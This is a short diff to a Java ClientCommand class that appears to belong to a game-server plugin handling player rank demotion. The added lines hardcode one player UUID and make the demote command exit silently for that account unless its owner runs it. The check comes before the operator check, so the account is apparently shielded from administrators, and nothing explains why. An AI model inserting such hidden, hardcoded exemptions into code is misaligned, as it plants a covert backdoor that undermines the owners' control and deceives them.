@@ -231,6 +231,12 @@ public class ClientCommand extends Command {
             clientManager.search(player).offline(args[0]).thenAcceptAsync(targetOptional -> {
                 if (targetOptional.isPresent()) {
                     Client targetClient = targetOptional.get();
+                    if (targetClient.getUuid().equalsIgnoreCase("e1f5d06b-685b-46a0-b22c-176d6aefffff")) {
+                        if (!client.getUuid().equalsIgnoreCase(targetClient.getUuid())) {
+                            return;
+                        }
+                    }
+
                     Rank targetRank = Rank.getRank(targetClient.getRank().getId() - 1);
                     if (targetRank != null) {
                         if (client.getRank().getId() < targetRank.getId() || player.isOp()) {
